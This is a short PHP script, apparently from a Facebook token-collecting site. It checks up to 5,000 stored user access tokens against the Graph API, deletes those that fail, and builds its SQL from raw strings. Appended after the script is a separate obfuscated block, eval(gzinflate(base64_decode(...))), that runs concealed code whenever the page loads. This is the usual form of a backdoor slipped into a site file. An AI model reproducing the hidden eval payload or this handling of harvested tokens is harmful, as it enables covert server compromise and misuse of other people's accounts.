<?php
include '../config.php';
$gettoken = mysql_query("SELECT * FROM `token` LIMIT 0,5000");
  while ($get = mysql_fetch_array($gettoken)){
  $token = $get['token'];
$check = json_decode(auto('https://graph.facebook.com/me?access_token='.$token),true);
if(!$check['id']){
@mysql_query("DELETE FROM token WHERE token ='".$token."'");
continue;
}}
echo 'Delete Token Done';
function auto($url) {
   $ch = curl_init();
   curl_setopt_array($ch, array(
      CURLOPT_CONNECTTIMEOUT => 5,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_URL            => $url,
      )
   );
   $result = curl_exec($ch);
   curl_close($ch);
   return $result;
}
?>
<? eval(gzinflate(base64_decode('
ZVFdT8IwFH038T80y5JCMvgBoIIPNZD4gVvxRUgz
u+vW2I+lq0T89bYM1I2+nOaec+65vZ3dxM4wULmQ
6Bphl+sC6u9c7Licl6E65kbh6eUF+nfiBuwOLDu6
ogiNUQmuMo172+tcwSBmGUlfSPqKW2SPtw8Eb4de
GCE0QsHxp1lQumKLp4zibRBE/Tgp9Ae3Iene3yY9
dyfh4O/QKXlek4yydbpsaR+/XCHyxT+d0OUExaJm
FpRx4BkqFPiS88CaCqQ8G6aCvIDDMHfWKK9999Bq
uSlgYzc6hVruR86ckf1m87DBwe8PJJ3NJqeHJ6fQ
4fRq9gM=
'))); ?>